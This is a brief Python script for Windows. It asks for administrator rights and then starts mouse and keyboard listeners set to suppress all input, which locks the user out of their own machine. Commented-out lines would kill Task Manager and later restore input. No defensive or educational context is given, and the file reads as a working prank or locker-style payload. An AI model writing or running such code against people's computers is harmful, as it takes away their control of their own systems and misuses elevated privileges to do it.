import pynput
from pynput.keyboard import Key, Controller
import subprocess
from time import sleep
si = subprocess.STARTUPINFO()
import pyuac
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

pyuac.runAsAdmin()
for x in range (10):
   
    # Disable mouse and keyboard events
    mouse_listener = pynput.mouse.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener = pynput.keyboard.Listener(suppress=True)
    keyboard_listener.start()
    # subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si)
    # sleep(1)

    # Enable mouse and keyboard events
    # mouse_listener.stop()
    # keyboard_listener.stop()